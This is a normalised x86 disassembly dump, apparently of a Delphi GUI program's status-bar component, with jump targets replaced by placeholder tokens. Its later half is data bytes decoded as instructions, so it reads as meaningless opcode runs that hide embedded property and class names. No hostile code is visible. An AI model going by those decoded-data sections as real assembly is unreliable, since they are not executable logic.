pop [ fs : 0x0 ]
add esp 0xc
sub_43ba68
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_40d538
mov edx ebx
and dl 0xfc
mov eax esi
call sub_462018
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_43baa4
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_419b1c
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_43b1ec
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_43bb10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_43b1ec
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403fd0
pop edi
pop esi
pop ebx
retn
sub_43bb44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_43b1ec
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_43bb7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43bba8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421bb0
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43bc5c
sub_43bbec
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_43bc5c
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_43bc5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43bd9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bda6
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40339c
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_43b1ec
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x94 ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_43b1ec
mov ecx eax
mov edx ebx
mov eax edi
call sub_43baa4
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_43b628
test al al
je r-xdata
sub_43bdb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43bdd3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bdda
retn
sub_43bde0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_43be18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43be3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43be44
retn
sub_43be50
push esp
mov esi 0x11030043
push esp
push ebx
je r-xdata
or [ eax + 0x62 ] esi
je r-xdata
add ah al
jb r-xdata
insd
inc ebx
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
xchg esp eax
or [ fs : eax + 0x62 ] dh
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
or al 0x0
add [ eax ] al
or al 0x54
push ebx
je r-xdata
insb
jae r-xdata
dec esp
outsd
ja r-xdata
add [ eax ] al
nop
mov esi 0x70060043
bound ecx [ esi + 0x6f ]
popad
outsb
insb
push ebx
je r-xdata
add [ esi ] dl
add [ eax ] al
call [ eax + 0xf ]
inc esp
add [ edi + ecx + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
push eax
mov esi 0x70060043
jae r-xdata
inc ecx
add ah dh
push cs
inc esp
add ah ah
cmove eax [ eax ]
mov ah 0x98
inc ecx
add ah ah
cwde
inc ecx
add ah bl
cwde
inc ecx
add [ eax + 0xe00440e ] ch
add [ eax ] al
and al 0xbf
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 4 + 0x43 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov edi 0xbf680043
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x42 ] dl
inc ebx
add [ esi ] al
jo r-xdata
nop
mov esi 0x150043
add bh bh
sbb [ eax ] dl
inc esp
add [ ecx ] al
popad
outsb
insb
nop
push 0x70043bf
or al 0x54
push ebx
je r-xdata
or [ fs : ebx + 0x6f ] al
js r-xdata
push esp
test al 0x5e
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x41 ] dl
inc ebx
or esi [ eax + 0x73 ]
dec edi
ja r-xdata
add [ eax + 0x42080002 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ss
add [ eax ] al
jae r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x65766542
insb
popad
outsb
insb
and al 0xbf
inc ebx
add [ eax + ebp * 2 + 0x70041 ] dh
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x6f430864
jb r-xdata
[ edi + ecx + 0x44 ]
insb
jae r-xdata
add [ eax - 0x41 ] ch
ja r-xdata
add bh bh
or [ eax ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ esi + ebx * 2 ] dh
inc ecx
add [ eax + eax ] dl
xchg esp eax
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax + eax ] bl
je r-xdata
sub [ eax + 0x41 ] ch
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
insb
jae r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x69 ] ch
xor al 0x40
jae r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43be44
retn
mov esi 0x11030043
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
mov edi 0x1c0043
popad
outsb
insb
inc edx
jbe r-xdata
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
insb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60043be ] dl
jo r-xdata
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
xor [ eax ] eax
mov al [ 0x68004031 ]
xchg edi eax
outsb
or [ gs : eax + 0x62 ] esi
dec esi
outsd
sub_43bffd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push cs
push eax
popad
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0xc0c8c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
rol [ ebx ] 0xf8
rol [ ebx ] 0x1c
add [ eax ] al
add al ah
push 0x34340041
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
outsb
je r-xdata
push esp
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5065646f
mov esi 0x180043
add bh bh
sub [ eax ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x6c797453
in al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
cmp [ eax ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040005 ] al
inc ecx
add ah cl
cdq
inc ecx
add [ eax ] bh
sahf
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add [ eax - 0x62 ] al
inc ecx
add ah dh
popfd
inc ecx
add ah dh
adc [ eax + eax + 0x64 ] al
0x9ae00041 0x41
add [ eax ] eax
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
pushad
adc [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050006 ] al
sub_43c1b0
and al bl
inc ebx
add [ eax ] bh
add al [ eax ]
add al bl
pop ss
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
adc [ eax + eax + 0x54 ] eax
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ecx + edx ] ah
inc esp
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
rcl [ ebp + eax * 2 + 0x44129c00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax + 0x1d ] dh
inc esp
add [ ebp + ebx + 0x13240044 ] ch
inc esp
add [ ebp + ebx + 0xe0044 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax ] dl
add al [ eax ]
add [ edi ] cl
add [ eax + esi * 4 ] bh
or eax 0x24b008b0
mov al 0x25
mov al 0x35
mov al 0x2b
mov esp 0xe0014
sldt [ 0xffffffffb3ffec00 ]
push ebx
push [ esi + 0x4414bcff ]
add [ eax - 0x33ffbbe5 ] bh
sbb eax [ eax + eax + 0x68 ]
sbb al 0x44
add ah bl
sbb [ eax + eax + 0x7c ] eax
sbb al 0x44
add [ edx + ebx ] al
inc esp
add ah al
sbb eax 0x1b100044
inc esp
add [ eax ] ch
sbb eax [ eax + eax + 0x48 ]
sbb eax [ eax + eax - 0x70 ]
sbb al 0x44
add [ eax + 0x13 ] cl
inc esp
add al dh
sbb eax [ eax + eax + 0x34 ]
adc eax 0x54100044
inc ebx
jne r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax - 0x23ffbaa7 ] ch
sbb al 0x44
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
jne r-xdata
je r-xdata
add al bl
push eax
popad
insd
push ebx
je r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ecx + edx ] ah
inc esp
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
add al 0x52
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
inc ebx
add [ eax ] bh
add al [ eax ]
add [ eax + 0x5c0043c1 ] dl
fcom [ ebx + 0x7b080041 ]
inc ebp
jae r-xdata
add eax 0x656e6150
je r-xdata
rcl [ ebp + eax * 2 + 0x44129c00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax + 0x1d ] dh
inc esp
add [ ebp + ebx + 0x13240044 ] ch
inc esp
add [ ebp + ebx + 0x540a0044 ] bh
push ebx
je r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax - 0x23ffbaa7 ] ch
sbb al 0x44
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ edi * 2 + 0x581c0045 ] al
xor al 0x40
add [ eax + 0x48004213 ] dh
xor al 0x40
popad
outsb
insb
adc al [ edx + edx * 2 ]
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
je r-xdata
jae r-xdata
add [ eax ] al
je r-xdata
outsb
je r-xdata
popad
jb r-xdata
add bh bh
mov al [ 0x10045c4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
jae r-xdata
add ecx [ eax ]
or [ ebx + 0x74 ] edx
popad
je r-xdata
add [ eax ] al
cmp bl al
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax ] al
or al 0x0
or [ ecx + 0x75 ] al
je r-xdata
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
jb r-xdata
add al al
sahf
add [ eax + 0x34 ] cl
inc eax
jae r-xdata
add [ eax ] al
mov eax eax
mov edi 0x43
outsd
insd
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] sub_422998
jo r-xdata
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
pop esp
popfd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
push edx
arpl [ gs : eax + eax - 0x14 ] si
les eax [ ebx ]
mov edi 0x43
arpl [ ebp + eax + 0x54 ] si
je r-xdata
add bh bh
in al dx
pop ebx
inc ebp
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
adc [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
insb
or al 0x54
or [ 0x656e6150 ] al
push esp
push ebx
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ eax ] 0xc4
jae r-xdata
jmp [ eax + 0x10045c4 ]
add [ ebp ] al
jpe r-xdata
sbb al [ edx ]
inc eax
pop esp
je r-xdata
inc edx
popad
jb r-xdata
add bh bh
jpe r-xdata
adc [ eax + eax + 0x54 ] eax
into
inc ebp
add [ eax - 0x27ffba6a ] cl
inc eax
add [ eax - 0x23ffbfcf ] ah
jae r-xdata
push ebx
je r-xdata
rol [ ebx ] 0x8c
sbb eax [ ebp ]
or eax [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
les eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
insb
jae r-xdata
inc [ eax + 0x5b ]
jae r-xdata
add [ eax + r-xdata ] dl
or [ edi ] cl
push esp
inc esp
jb r-xdata
add [ eax ] cl
inc esp
jb r-xdata
or [ ebp ] al
je r-xdata
inc ebp
add [ ebx + ebx + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add bh bh
inc eax
pop ebx
jb r-xdata
add al dh
ja r-xdata
inc ebx
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
outsd
outsb
jae r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
add [ 0x6e450700 ] dl
popad
bound ebp [ ebp + 0x64 ]
cmp [ esi ] ch
inc edx
add [ eax ] ch
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or ah al
popad
outsb
insb
inc ebp
jbe r-xdata
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
loopne r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
imul ebp [ esi + 0x74 ] 0x43c10873
add [ eax ] cl
add al [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
inc eax
add [ 0xfffffffff4ff0002 ] dl
push ss
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebx + 0x69 ] dl
jpe r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
and [ eax + eax ] 0x7
dec edi
outsb
inc ebx
inc edi
jb r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
nop
adc al 0x44
add [ ecx ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0020 ] al
imul ebp [ ebp + 0x70 ] 0x6554656c
js r-xdata
add [ eax ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
js r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jo r-xdata
jmp [ eax ]
add [ eax ] dl
adc [ eax ] al
cdq
add [ eax ] al
[ ebx + ebx * 2 + 0x5b640045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
pop ds
add [ ebx ] cl
push ebx
imul ebp [ ebp + 0x70 ] 0x6150656c
outsb
insb
in al 0x10
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax + 0x1004414 ]
add al [ eax ]
dec [ eax + 0x1004413 ]
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
inc esp
jb r-xdata
push eax
outsd
jo r-xdata
adc [ eax ] al
pop ss
add al [ eax ]
dec [ eax + 0x100441b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
or eax 0x53657355
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
adc al 0x2
add bh bh
mov [ ebx ] dl
inc esp
add [ ecx ] al
jo r-xdata
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
pop edi
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
jo r-xdata
jb r-xdata
jo r-xdata
je r-xdata
or eax 0x1000045
dec ebp
outsd
jbe r-xdata
insb
inc ebx
insb
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942c935
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
rol [ ebx ] 0x30
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120026 ] al
outsb
inc ebx
jb r-xdata
inc ebx
outsd
outsb
je r-xdata
outsb
insd
inc esi
outsd
outsb
je r-xdata
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630a
jb r-xdata
jb r-xdata
dec edi
outsb
push edx
jae r-xdata
jo r-xdata
add [ eax ] al
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or cl [ edi + 0x6e ]
popad
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ ecx + ebx * 2 + 0x45 ]
jne r-xdata
inc ebp
jb r-xdata
jae r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
add eax [ eax ]
add [ eax ] al
in al 0xca
inc ebx
add [ edx ] cl
arpl [ eax + edx * 2 + 0x72 ] sp
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630b
outsd
jae r-xdata
jpe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
inc ebp
add al ah
add [ eax ] al
jmp eax
insb
inc esp
outsd
ja r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
je r-xdata
or ah [ fs : ebx + 0x64 ]
arpl [ ebp + 0x73 ] si
jae r-xdata
popad
jb r-xdata
inc ebp
jb r-xdata
rol [ ebx + ecx * 8 + 0x43 ] 0x0
jb r-xdata
jae r-xdata
or ah [ ebx + 0x64 ]
add [ eax ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
les ecx [ 0x1000045 ]
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
push ebp
jo r-xdata
call 0xffffffffd8440f13
add [ eax ] al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
or al 0x45
add [ eax ] cl
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
outsd
outsb
push es
je r-xdata
popa
arpl [ ebx + esi * 2 + 0x44 ] sp
or esp [ ebx + 0x64 ]
push eax
outsd
jae r-xdata
adc [ fs : ebx + 0x64 ] ah
jne r-xdata
popad
jae r-xdata
add [ ebx ] cl
arpl [ ebx + esi * 2 + 0x53 ] sp
inc esp
jb r-xdata
xor al [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
retn
jae r-xdata
jb r-xdata
inc ebx
outsd
outsb
jbe r-xdata
inc esp
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
push es
je r-xdata
push cs
inc edx
outsd
je r-xdata
add al ah

outsb
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
